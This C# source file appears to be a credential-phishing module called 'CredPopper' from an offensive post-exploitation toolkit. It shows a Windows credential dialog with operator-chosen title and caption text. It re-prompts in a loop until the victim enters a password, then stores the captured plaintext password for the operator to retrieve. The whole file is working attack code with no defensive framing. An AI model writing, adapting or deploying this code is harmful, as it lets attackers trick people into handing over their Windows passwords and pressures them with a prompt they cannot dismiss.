using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Core.CredPopper
{
    public class CredentialsPrompt
    {
        public static string title;
        public static string caption;
        public static string creds;
        public static string usernameField;

        [DllImport("User32.dll")]
        private static extern IntPtr GetParent(IntPtr hwnd);

        [DllImport("credui", CharSet = CharSet.Unicode)]
        private static extern CredUIReturnCodes CredUIPromptForCredentialsW(ref CREDUI_INFO creditUR,
        string targetName,
        IntPtr reserved1,
        int iError,
        StringBuilder userName,
        int maxUserName,
        StringBuilder password,
        int maxPassword,
        [MarshalAs(UnmanagedType.Bool)] ref bool pfSave,
        CREDUI_FLAGS flags);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [Flags]
        private enum CREDUI_FLAGS
        {
            INCORRECT_PASSWORD = 0x1,
            DO_NOT_PERSIST = 0x2,
            REQUEST_ADMINISTRATOR = 0x4,
            EXCLUDE_CERTIFICATES = 0x8,
            REQUIRE_CERTIFICATE = 0x10,
            SHOW_SAVE_CHECK_BOX = 0x40,
            ALWAYS_SHOW_UI = 0x80,
            REQUIRE_SMARTCARD = 0x100,
            PASSWORD_ONLY_OK = 0x200,
            VALIDATE_USERNAME = 0x400,
            COMPLETE_USERNAME = 0x800,
            PERSIST = 0x1000,
            SERVER_CREDENTIAL = 0x4000,
            EXPECT_CONFIRMATION = 0x20000,
            GENERIC_CREDENTIALS = 0x40000,
            USERNAME_TARGET_CREDENTIALS = 0x80000,
            KEEP_USERNAME = 0x100000,
        }

        private enum CredUIReturnCodes
        {
            NO_ERROR = 0,
            ERROR_CANCELLED = 1223,
            ERROR_NO_SUCH_LOGON_SESSION = 1312,
            ERROR_NOT_FOUND = 1168,
            ERROR_INVALID_ACCOUNT_NAME = 1315,
            ERROR_INSUFFICIENT_BUFFER = 122,
            ERROR_INVALID_PARAMETER = 87,
            ERROR_INVALID_FLAGS = 1004,
            ERROR_BAD_ARGUMENTS = 160
        }

        private const int MAX_USER_NAME = 100;
        private const int MAX_PASSWORD = 100;
        private const int MAX_DOMAIN = 100;

        public static void GetCreds()
        {
            Console.WriteLine(creds);
        }

        public static void CredPopper()
        {
            int minlengthpassword = 2;
            string title = CredentialsPrompt.title;
            string caption = CredentialsPrompt.caption;
            string username = CredentialsPrompt.usernameField;

            string host = title;
            CREDUI_INFO info = new CREDUI_INFO();

            info.pszCaptionText = host;
            info.pszMessageText = caption;

            CREDUI_FLAGS flags = CREDUI_FLAGS.GENERIC_CREDENTIALS | CREDUI_FLAGS.SHOW_SAVE_CHECK_BOX | CREDUI_FLAGS.ALWAYS_SHOW_UI | CREDUI_FLAGS.EXPECT_CONFIRMATION | CREDUI_FLAGS.PERSIST;

            bool savePwd = false;
            //string username = Environment.UserDomainName + "\\" + Environment.UserName;
            string password = "";

            CredUIReturnCodes result = PromptForCredentials(ref info, host, 0, username, ref password, ref savePwd, flags, minlengthpassword);
            creds = "[+] Username: " + username + "\r\n[+] Password: " + password;
        }

        private static CredUIReturnCodes PromptForCredentials(ref CREDUI_INFO creditUI, string targetName, int netError, string userName, ref string password, ref bool save,CREDUI_FLAGS flags, int minlengthpassword)
        {
            StringBuilder usernamenew = new StringBuilder(MAX_PASSWORD);
            usernamenew.Append(userName);
            StringBuilder user = new StringBuilder(MAX_USER_NAME);
            StringBuilder pwd = new StringBuilder(MAX_PASSWORD);
            creditUI.cbSize = Marshal.SizeOf(creditUI);

            CredUIReturnCodes result = CredUIPromptForCredentialsW(ref creditUI, targetName, IntPtr.Zero, netError, usernamenew, MAX_USER_NAME, pwd, MAX_PASSWORD, ref save,  flags);

            userName = user.ToString();
            password = pwd.ToString();

            while (pwd.ToString().Length < minlengthpassword)
            {
                CredUIReturnCodes result2 = CredUIPromptForCredentialsW(ref creditUI, targetName, IntPtr.Zero, netError, usernamenew, MAX_USER_NAME, pwd, MAX_PASSWORD, ref save, flags);
            }

            userName = user.ToString();
            password = pwd.ToString();

            return result;
        }
    }
}
